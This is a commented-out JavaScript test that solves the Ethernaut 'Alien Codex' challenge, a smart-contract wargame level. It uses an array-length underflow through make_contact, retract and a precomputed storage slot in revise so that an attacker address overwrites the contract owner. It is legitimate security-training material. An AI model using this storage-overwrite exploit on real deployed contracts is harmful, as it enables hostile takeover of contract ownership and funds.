
/*
import { accounts, contract } from '@openzeppelin/test-environment';
import assert = require('assert');

// Addresses
const [
    owner, // Contract owner
    attacker, // Attacker
] = accounts;

// Loads contracts
const AlienCodex = contract.fromArtifact('AlienCodex');
let alienCodex: any;

beforeEach(async () => {
    alienCodex = await AlienCodex.new({ from: owner });
});

it.only('Alien Codex -> claim ownership to complete the level.', async () => {

    assert(await alienCodex.isOwner({ from: owner }) === true, 'owner is contract creator');

    await alienCodex.make_contact();

    await alienCodex.retract();

    // location of owner ptr, offset by array's frame of reference
    // No clue how this is calculated, but through underflow the codex array, it is possible
    // to overwrite the contract owner
    const owner_loc = '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'; 
    const padding = '0x000000000000000000000000';
    let _data = padding + attacker.substr(2);

    await alienCodex.revise(owner_loc, _data, { from: attacker });

    assert(await alienCodex.isOwner({ from: attacker }) === true, 'owner is contract creator');

});
*/

/*
    To run this test, truffle-config.js needs to be updated with
    contracts_directory: "./contracts/19-alien-codex/",
      compilers: {
        solc: {
            version: "0.5.0",
*/